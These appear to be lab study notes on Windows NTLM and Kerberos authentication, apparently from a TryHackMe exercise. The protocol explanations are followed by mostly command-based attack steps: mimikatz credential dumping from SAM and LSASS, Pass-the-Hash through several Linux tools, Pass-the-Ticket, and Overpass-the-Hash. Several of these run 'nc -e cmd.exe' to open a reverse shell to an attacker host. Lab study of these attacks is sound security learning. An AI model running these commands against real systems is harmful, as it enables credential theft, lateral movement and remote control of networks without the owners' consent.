There are two types of Authentication **Kerberos** and **NTLM**

**First: NTLM Authentication**
```
    The client sends an authentication request to the server they want to access.
    The server generates a random number and sends it as a challenge to the client.
    The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
    The server forwards both the challenge and the response to the Domain Controller for verification.
    The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
    The server forwards the authentication result to the client.
```

**Pass-the-Hash attack**

Is a technique used in network security attacks where an attacker uses a hashed password to authenticate to a remote server or service, instead of using the plaintext password. 
To extract NTLM hashes, we can either use **mimikatz** to read the local SAM or extract hashes directly from LSASS memory.
```
mimikatz # privilege::debug    
mimikatz # token::elevate    # to elevate us with higher privilege
mimikatz # lsadump::sam      # hashes of local users only and the domain users will not be listed
```
We will use this better to solve **sam** problem:
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv     # hashes of local users and the domain users will be listed
```

We can then use the extracted hashes to perform a PtH attack by using **mimikatz** to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:<AdminUser> /domain:<DomainName> /ntlm:<AdminNTML> /run:"nc.exe -e cmd.exe <ATTACKER_IP> 5555"
```
Then setup a lisenter using **nc**:
```
nc -nlvp 5555
```
**Passing the Hash Using Linux:**
```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```
```
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```
```
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```


**Secend: Kerberos Authentication**<br>
```
1> The user sends his username and a timestamp encrypted using a key derived from his password to the Key Distribution Center (KDC), a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
The KDC will create and send back a Ticket Granting Ticket (TGT), allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a Session Key is given to the user, which they will need to generate the requests that follow.
Notice the TGT is encrypted using the krbtgt account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
2> When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a Ticket Granting Service (TGS). TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a Service Principal Name (SPN), which indicates the service and server name we intend to access.
As a result, the KDC will send us a TGS and a Service Session Key, which we will need to authenticate to the service we want to access. The TGS is encrypted using the Service Owner Hash. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
3> The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.

```

**Pass-the-Ticket attack**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:
```
klist
```

**Overpass-the-hash / Pass-the-Key attack**

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
<br>We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
If we have the RC4 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"nc -e cmd.exe ATTACKER_IP 5556"
```
If we have the AES128 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"nc -e cmd.exe ATTACKER_IP 5556"
```
If we have the AES256 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"nc -e cmd.exe ATTACKER_IP 5556"
```


























